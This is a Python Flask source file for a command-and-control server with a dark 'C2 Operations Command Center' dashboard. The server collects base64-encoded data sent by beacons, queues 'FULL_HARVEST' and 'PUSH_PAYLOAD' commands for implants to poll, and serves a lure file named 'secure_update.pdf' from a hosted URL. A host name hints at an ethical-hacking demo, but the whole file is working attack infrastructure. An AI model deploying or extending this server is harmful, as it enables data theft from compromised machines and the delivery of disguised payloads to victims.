from flask import Flask, request, jsonify, render_template_string, send_from_directory
import os
import base64

app = Flask(__name__)
telemetry_logs = []
pending_command = "NO_OP"
current_payload = {
    "type": "document",
    "file_url": "https://cehdemo.onrender.com/download/secure_update.pdf",
    "message": "Confidential system notification payload."
}

ASSET_DIR = os.path.join(os.getcwd(), "static")
os.makedirs(ASSET_DIR, exist_ok=True)

@app.route('/')
def dashboard():
    return render_template_string('''
        <!DOCTYPE html>
        <html>
        <head>
            <title>C2 Unified Operations Dashboard</title>
            <style>
                body { font-family: system-ui, sans-serif; background: #0f172a; color: #f8fafc; margin: 0; padding: 20px; }
                .container { max-width: 1000px; margin: auto; background: #1e293b; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
                h2 { color: #38bdf8; border-bottom: 2px solid #334155; padding-bottom: 10px; }
                .status { display: inline-block; padding: 6px 12px; background: #22c55e; color: #fff; border-radius: 4px; font-weight: bold; font-size: 14px; }
                .log-box { background: #0f172a; border: 1px solid #334155; padding: 15px; border-radius: 6px; height: 300px; overflow-y: auto; font-family: monospace; font-size: 13px; color: #a5f3fc; white-space: pre-wrap; word-break: break-all; }
                .btn { display: inline-block; margin-top: 10px; margin-right: 10px; padding: 10px 15px; background: #2563eb; color: white; text-decoration: none; border-radius: 4px; font-weight: bold; border: none; cursor: pointer; }
                .btn:hover { background: #1d4ed8; }
                .btn-danger { background: #dc2626; }
                .btn-danger:hover { background: #b91c1c; }
                .panel { display: flex; gap: 20px; margin-bottom: 20px; }
                .control-group { background: #0f172a; padding: 15px; border-radius: 6px; flex: 1; border: 1px solid #334155; }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>C2 Operations Command Center</h2>
                <p>C2 Engine Status: <span class="status">LISTENING & ACTIVE</span></p>

                <div class="panel">
                    <div class="control-group">
                        <h3>Action Dispatcher</h3>
                        <form action="/set_command" method="POST">
                            <button type="submit" name="cmd" value="FULL_HARVEST" class="btn btn-danger">Trigger Telemetry Harvest</button>
                            <button type="submit" name="cmd" value="PUSH_PAYLOAD" class="btn">Push Asset (PDF/Img)</button>
                        </form>
                    </div>
                </div>

                <h3>Live Inbound Node Telemetry Stream</h3>
                <div class="log-box" id="logBox">Awaiting active beacon connection...</div>
            </div>
            <script>
                async function fetchLogs() {
                    try {
                        const res = await fetch('/logs');
                        const data = await res.json();
                        if (data.logs && data.logs.length > 0) {
                            document.getElementById('logBox').innerHTML = data.logs.join('<br><br>');
                        }
                    } catch(e) { console.error(e); }
                }
                setInterval(fetchLogs, 1500);
            </script>
        </body>
        </html>
    ''')

@app.route('/collect', methods=['POST'])
def receive_telemetry():
    data = request.get_json() or {}
    encoded_payload = data.get('payload', '')
    try:
        decoded_text = base64.b64decode(encoded_payload.encode('utf-8')).decode('utf-8')
    except Exception:
        decoded_text = "[Payload Decoding Failed]"

    log_entry = f"[{request.remote_addr}] Telemetry Report: {decoded_text} | Timestamp: {data.get('timestamp')}"
    telemetry_logs.append(log_entry)
    if len(telemetry_logs) > 60:
        telemetry_logs.pop(0)
    return jsonify({"status": "acknowledged"}), 200

@app.route('/command', methods=['GET'])
def get_command():
    global pending_command
    cmd = pending_command
    pending_command = "NO_OP"
    return jsonify({"command": cmd})

@app.route('/check_payload', methods=['GET'])
def check_payload():
    return jsonify(current_payload)

@app.route('/set_command', methods=['POST'])
def set_command():
    global pending_command
    pending_command = request.form.get('cmd', 'NO_OP')
    return '''<script>window.location.href="/";</script>'''

@app.route('/logs', methods=['GET'])
def get_logs():
    return jsonify({"logs": telemetry_logs})

@app.route('/download/<path:filename>', methods=['GET'])
def download_asset(filename):
    return send_from_directory(ASSET_DIR, filename, as_attachment=True)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
